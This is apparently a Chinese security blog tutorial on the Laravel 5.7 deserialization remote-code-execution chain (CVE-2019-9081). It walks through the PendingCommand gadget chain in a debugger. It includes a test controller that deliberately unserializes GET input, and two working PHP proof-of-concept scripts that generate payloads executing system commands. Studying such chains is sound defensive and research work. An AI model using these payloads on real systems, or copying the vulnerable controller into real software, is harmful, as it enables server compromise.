# 前言

网上有很多laravel5.7的漏洞分析,但是自己跟着师傅的思路做了一遍后,想写这么一篇通俗易懂的分析,在复现的过程中加一点思路进去,比较适合才

# 环境搭建

Laravel5.7

PHPstudy+PHP7.3.5（PHP >= 7.1.3）

直接用composer安装

```
composer create-project laravel/laravel=5.7 laravel5-7 --prefer-dist
```

`php artisan serve`启动

接下来添加路由

routes\web.php

```
Route::get("/index","\App\Http\Controllers\TestController@demo");
```

app\Http\Controllers下新建一个TestController.php控制器

```
<?php 
namespace App\Http\Controllers;

use Illuminate\Http\Request;
class TestController extends Controller
{
    public function demo()
    {
        if(isset($_GET['c'])){
            $code = $_GET['c'];
            unserialize($code);
        }
        else{
            highlight_file(__FILE__);
        }
        return "Welcome to laravel5.7";
    }
}
```

![image-20210816105746695](images/1.png)

# 漏洞分析

在laravel5.7的版本中新增了一个`PendingCommand`类,定位在

```
vendor\laravel\framework\src\Illuminate\Foundation\Testing\PendingCommand.php
```

官方的解释该类主要功能是用作命令执行，并且获取输出内容。

进入这个类中,看到结尾有个__destruct()方法,可以作为反序列化的入口点

![image-20210816134305766](images/2.png)

`$this->hasExecuted`的默认值是false

![image-20210816134320663](images/3.png)

那这里就可以直接调用run()方法

跟进run()

```
public function run()
{
    $this->hasExecuted = true;

    $this->mockConsoleOutput();

    try {
        $exitCode = $this->app[Kernel::class]->call($this->command, $this->parameters);
    } catch (NoMatchingExpectationException $e) {
        if ($e->getMethodName() === 'askQuestion') {
            $this->test->fail('Unexpected question "'.$e->getActualArguments()[0]->getQuestion().'" was asked.');
        }

        throw $e;
    }

    if ($this->expectedExitCode !== null) {
        $this->test->assertEquals(
            $this->expectedExitCode, $exitCode,
            "Expected status code {$this->expectedExitCode} but received {$exitCode}."
        );
    }

    return $exitCode;
}
```

看到一个参数可控的调用

```
$exitCode = $this->app[Kernel::class]->call($this->command, $this->parameters)
```

不过在此之前调用了一个mockConsoleOutput函数,跟进看看

```
protected function mockConsoleOutput()
{
    $mock = Mockery::mock(OutputStyle::class.'[askQuestion]', [
        (new ArrayInput($this->parameters)), $this->createABufferedOutputMock(),
    ]);

    foreach ($this->test->expectedQuestions as $i => $question) {
        $mock->shouldReceive('askQuestion')
            ->once()
            ->ordered()
            ->with(Mockery::on(function ($argument) use ($question) {
                return $argument->getQuestion() == $question[0];
            }))
            ->andReturnUsing(function () use ($question, $i) {
                unset($this->test->expectedQuestions[$i]);

                return $question[1];
            });
    }

    $this->app->bind(OutputStyle::class, function () use ($mock) {
        return $mock;
    });
}
```

这个`Mockery::mock`实现了一个对象模拟,但是我们的目的是要走完这段代码,这里用断点调试去单点调试,让他不报错然后回到下面参数可用的调用,不过这里还会调用一个`createABufferedOutputMock`函数,继续跟进

```
private function createABufferedOutputMock()
{
    $mock = Mockery::mock(BufferedOutput::class.'[doWrite]')
            ->shouldAllowMockingProtectedMethods()
            ->shouldIgnoreMissing();

    foreach ($this->test->expectedOutput as $i => $output) {
        $mock->shouldReceive('doWrite')
            ->once()
            ->ordered()
            ->with($output, Mockery::any())
            ->andReturnUsing(function () use ($i) {
                unset($this->test->expectedOutput[$i]);
            });
    }

    return $mock;
}
```

又实现了一次对象模拟,我们的目的还是为了走完这段代码,继续往下看,进入foreach

里面的`$this->test->expectedOutput`这里的`$this->test`可控,去调用任意类的expectedOutput属性,或者去调用`__get()`魔术方法,随便选取一个可用的get方法就行,这里可以用`DefaultGenerator.php`类或者`Illuminate\Auth\GenericUser`类,这个就很多了,只要找到个可用的就行

`DefaultGenerator.php`

![image-20211123224515791](images/4.png)

`GenericUser.php`

![image-20211123224547000](images/5.png)

随便用一个就行,只是要注意这里是foreach,所以我们要返回一个数组

`$this->default=['T0WN'=>"hacker"]`或者`$this->attributes['expectedOutput']=1`

回到mockConsoleOutput方法，也进入了应该foreach循环

![image-20211125185821156](images/6.png)

这里的绕过方法和刚才一样去调用get方法,为了一次性控制,我就采用DefaultGenerator.php的get方法,然后走完这段代码回到run方法

但是这里的`$this->app`需要赋值为一个类,不然会报错

![image-20211125185858443](images/7.png)

在注释中说了这里的是应该为`\Illuminate\Foundation\Application`类

接下来就是产生漏洞的关键代码

```
$exitCode = $this->app[Kernel::class]->call($this->command, $this->parameters);
```

`Kernel::class`是完全限定名称，返回的是一个类的完整的带上命名空间的类名

`Kernel::class`在这里是一个固定值`Illuminate\Contracts\Console\Kernel`,去调用`$this->app[Kernel::class]`里面的call函数

这段代码有点晦涩,先写一个poc试试,然后再来单点调试

```
<?php

namespace Illuminate\Foundation\Testing {
    class PendingCommand
    {
        protected $command;
        protected $parameters;
        public $test;
        protected $app;
        public function __construct($test, $app, $command, $parameters)
        {
            $this->app = $app;
            $this->test = $test;
            $this->command = $command;
            $this->parameters = $parameters;
        }
    }
}

namespace Faker {
    class DefaultGenerator
    {
        protected $default;

        public function __construct($default = null)
        {
            $this->default = $default;
        }
    }
}

namespace Illuminate\Foundation {
    class Application
    {
        public function __construct($instances = [])
        {
        }
    }
}

namespace {
    $defaultgenerator = new Faker\DefaultGenerator(array("T0WN" => "1"));
    $application = new Illuminate\Foundation\Application();
    $pendingcommand = new Illuminate\Foundation\Testing\PendingCommand($defaultgenerator, $application, "system", array("whoami"));
    echo urlencode(serialize($pendingcommand));
}
```

利用上面的poc这里走到了这段代码

```
$exitCode = $this->app[Kernel::class]->call($this->command, $this->parameters);
```

但是再f8往下走就直接抛出异常了

所以就f7跟进看看调用栈是怎么样的,来到了offsetGet函数

或者直接跟进`$this->app[Kernel::class]`这段代码

![image-20211123225723611](images/8.png)

跟进make

```
public function make($abstract, array $parameters = [])
{
    $abstract = $this->getAlias($abstract);

    if (isset($this->deferredServices[$abstract]) && ! isset($this->instances[$abstract])) {
        $this->loadDeferredProvider($abstract);
    }

    return parent::make($abstract, $parameters);
}
```

跟进其父类的make

```
public function make($abstract, array $parameters = [])
{
    return $this->resolve($abstract, $parameters);
}
```

上面这些函数都没什么可控点

跟进resolve

```
protected function resolve($abstract, $parameters = [])
{
    $abstract = $this->getAlias($abstract);

    $needsContextualBuild = ! empty($parameters) || ! is_null(
        $this->getContextualConcrete($abstract)
    );

    // If an instance of the type is currently being managed as a singleton we'll
    // just return an existing instance instead of instantiating new instances
    // so the developer can keep using the same objects instance every time.
    if (isset($this->instances[$abstract]) && ! $needsContextualBuild) {
        return $this->instances[$abstract];
    }

    $this->with[] = $parameters;

    $concrete = $this->getConcrete($abstract);
    ......
```

一直跟到resolve的这没报错,但是单步调试继续又报错了

![image-20211125195941389](images/9.png)

那就接着跟进build函数

在里面的这个地方报错了

![image-20211125200042610](images/10.png)

if判断这个类是否能够实例化,当前类是不能实例化的

可用看看Kernel类的定义

```
interface Kernel
```

定义为一个接口类,可用在PHP官方文档看到一个例子的输出

![image-20211125200321843](images/11.png)

我们看输出效果就知道了,接口类和抽象类还有构造方法私有的类是不能实例化的,接口类的子类,抽象类的继承类是可以实例化的

所以这里进入了这个if判断

跟进notInstantiable

```
protected function notInstantiable($concrete)
{
    if (! empty($this->buildStack)) {
        $previous = implode(', ', $this->buildStack);

        $message = "Target [$concrete] is not instantiable while building [$previous].";
    } else {
        $message = "Target [$concrete] is not instantiable.";
    }

    throw new BindingResolutionException($message);
}
```

可以看到会抛出一个异常,这就是为什么会报错的原因了

明白了原因再来看解决办法

回到resolve方法

![image-20211125200659383](images/12.png)

跟进getConcrete方法

```
protected function getConcrete($abstract)
{
    if (! is_null($concrete = $this->getContextualConcrete($abstract))) {
        return $concrete;
    }

    // If we don't have a registered resolver or concrete for the type, we'll just
    // assume each type is a concrete name and will attempt to resolve it as is
    // since the container should be able to resolve concretes automatically.
    if (isset($this->bindings[$abstract])) {
        return $this->bindings[$abstract]['concrete'];
    }

    return $abstract;
}
```

这里问题就出在这儿,可以看到

```
if (isset($this->bindings[$abstract])) {
        return $this->bindings[$abstract]['concrete'];
    }
```

当存在`$this->bindings[$abstract]`的时候就返回`$this->bindings[$abstract]['concrete']`,否则就返回`$abstract`

我们通过断点调试可以清楚的看到,`$abstract`的值是Kernel这个类

![image-20211125200929937](images/13.png)

先来看看`bindings`属性,这个是`Illuminate\Container\Container`类的属性,不过我们这里的`$this->app`是`Illuminate\Foundation\Application`类,这个类刚好是`Container`类的子类,可以直接从`Illuminate\Foundation\Application`类来控制`$this->bindings`属性

那这里`$this->bindings[$abstract]['concrete']`是可控的了直接return,出这个函数

所以`$concrete`的值就是我们可以控制的任意类

到了这儿的if判断

![image-20211125201519421](images/14.png)

跟进`isBuildable`

```
protected function isBuildable($concrete, $abstract)
{
    return $concrete === $abstract || $concrete instanceof Closure;
}
```

这里的`$concrete`的值就是我们可以控制的任意类,`$abstract`还是之前的Kernel类,显然不成立

所以执行else,回到make函数,改变其参数值为我们控制的类,同样的流程再走一遍来到resolve方法

此时的`$concrete`与`$abstract`的值是一样的了,那就可以进入if,调用build方法

在build方法里有PHP反射机制

```
$reflector = new ReflectionClass($concrete);
```

这里`$concrete`就是我们刚才通过控制`$this->bindings[$abstract]['concrete']`返回的任意类

那这里就可以实例化任意类了

执行到了刚才报错的地方

![image-20211125202424505](images/15.png)

当前类是可以实例化的,直接跳过if,然后层层返回,最后实例化了任意类

当然这里实例化的类里面需要具有call函数,这里选用了`Illuminate\Foundation\Application`类,所以最后返回的实例化对象就是Application类

然后调用里面的call方法,这里Application类并没有call方法,所以会直接跳到它父类Container.php里面的call方法

```
public function call($callback, array $parameters = [], $defaultMethod = null)
{
    return BoundMethod::call($this, $callback, $parameters, $defaultMethod);
}
```

跟进BoundMethod类的静态call方法

```
public static function call($container, $callback, array $parameters = [], $defaultMethod = null)
{
    if (static::isCallableWithAtSign($callback) || $defaultMethod) {
        return static::callClass($container, $callback, $parameters, $defaultMethod);
    }

    return static::callBoundMethod($container, $callback, function () use ($container, $callback, $parameters) {
        return call_user_func_array(
            $callback, static::getMethodDependencies($container, $callback, $parameters)
        );
    });
}
```

跳过了第一个分支语句,来到return这里

![image-20211125203542900](images/16.png)

```
return static::callBoundMethod($container, $callback, function () use ($container, $callback, $parameters) {
    return call_user_func_array(
        $callback, static::getMethodDependencies($container, $callback, $parameters)
    );
});
```

![image-20211125204120025](images/17.png)

跟进`callBoundMethod`

![image-20211125204142725](images/18.png)

判断`$callback`是不是数组,从上面断点调试的时候的值来看`$callback`是传进来的system,并不是数组所以很顺利进入了这个if,返回了`$default`

再看`$default`是`callBoundMethod`的第三个参数,这是一个自定义函数

```
function () use ($container, $callback, $parameters) {
    return call_user_func_array(
        $callback, static::getMethodDependencies($container, $callback, $parameters)
    );
}
```

直接`return`一个call_user_func_array(),第一个参数是`$callback`,现在跟进getMethodDependencies看看第二个参数怎么来的

```
protected static function getMethodDependencies($container, $callback, array $parameters = [])
{
    $dependencies = [];

    foreach (static::getCallReflector($callback)->getParameters() as $parameter) {
        static::addDependencyForCallParameter($container, $parameter, $parameters, $dependencies);
    }

    return array_merge($dependencies, $parameters);
}
```

就是返回一个合并数组,因为`$dependencies`是空数组,`$parameters`是我们传进来的whoami

![image-20211125205420184](images/19.png)

所以返回值就是whoami

那`$default`的值就是`system("whoami")`了,单步跳过,会到了run方法发现命令执行成功

![image-20211125205543686](images/20.png)

# 漏洞复现

## POC1

```
<?php

namespace Illuminate\Foundation\Testing {

    use Faker\DefaultGenerator;
    use Illuminate\Foundation\Application;

    class PendingCommand
    {
        protected $command;
        protected $parameters;
        protected $app;
        public $test;

        public function __construct($command, $parameters, $class, $app)
        {
            $this->command = $command;
            $this->parameters = $parameters;
            $this->test = $class;
            $this->app = $app;
        }
    }
    $a = array("DawnT0wn" => "1");
    $app = array("Illuminate\Contracts\Console\Kernel" => array("concrete" => "Illuminate\Foundation\Application"));
    echo urlencode(serialize(new PendingCommand("system", array("whoami"), new DefaultGenerator($a), new Application($app))));
}

namespace Faker {
    class DefaultGenerator
    {
        protected $default;

        public function __construct($default = null)
        {
            $this->default = $default;
        }
    }
}


namespace Illuminate\Foundation {
    class Application
    {
        protected $hasBeenBootstrapped = false;
        protected $bindings;

        public function __construct($bind)
        {
            $this->bindings = $bind;
        }
    }
}

```

这里`$this->parameters`需要是一个数组类型才行,不然在这里在第一个对象模拟这里就会报错

![image-20211125211128683](images/21.png)

![image-20211125211219328](images/22.png)

## POC2

刚才我们返回Application实例化对象的时候是通过反射去实现的

但是回到resolve方法

![image-20211125211441013](images/23.png)

看看这里的if语句,先看后面`$needsContextualBuild`我们打断点的时候可以很明显的看到他的值是false,所以如果存在`$this->instances[$abstract]`就会直接返回`$this->instances[$abstract]`,这个是可控的,所以就可以直接返回一个实例化的Application对象了

exp如下

```
<?php

namespace Illuminate\Foundation\Testing {
    class PendingCommand
    {
        protected $command;
        protected $parameters;
        public $test;
        protected $app;
        public function __construct($test, $app, $command, $parameters)
        {
            $this->app = $app;
            $this->test = $test;
            $this->command = $command;
            $this->parameters = $parameters;
        }
    }
}

namespace Faker {
    class DefaultGenerator
    {
        protected $default;

        public function __construct($default = null)
        {
            $this->default = $default;
        }
    }
}

namespace Illuminate\Foundation {
    class Application
    {
        protected $instances = [];

        public function __construct($instances = [])
        {
            $this->instances['Illuminate\Contracts\Console\Kernel'] = $instances;
        }
    }
}

namespace {
    $defaultgenerator = new Faker\DefaultGenerator(array("DawnT0wn" => "1"));
    $app = new Illuminate\Foundation\Application();
    $application = new Illuminate\Foundation\Application($app);
    $pendingcommand = new Illuminate\Foundation\Testing\PendingCommand($defaultgenerator, $application, "system", array("whoami"));
    echo urlencode(serialize($pendingcommand));
}
```

![image-20211125211918619](images/24.png)

# 总结

laravel5.7的链子肯定是不止这一条的,例如https://xz.aliyun.com/t/9478这篇文章里面有几条链是在laravel5.4到5.8是通杀的,还有H3师傅总结的https://www.anquanke.com/post/id/258264链子,这里有10多条,里面有好几条也是可以通杀的,所以这里只分析了5.7最典型的一条链子

这条链子和以往的复现不太一样,对POP挖掘思路有很大的影响,可以明白在POP链挖掘的时候依次打断点去单步调试最后找到一条完整的链子,而不是每次去看到师傅的POC复现,这能让自己明白如何去寻找一条完整的POP链



参考链接

[laravelv5.7反序列化rce(CVE-2019-9081) | WisdomTree's Blog (laworigin.github.io)](https://laworigin.github.io/2019/02/21/laravelv5-7反序列化rce/)

https://xz.aliyun.com/t/8359#toc-6

https://blog.csdn.net/rfrder/article/details/113826483
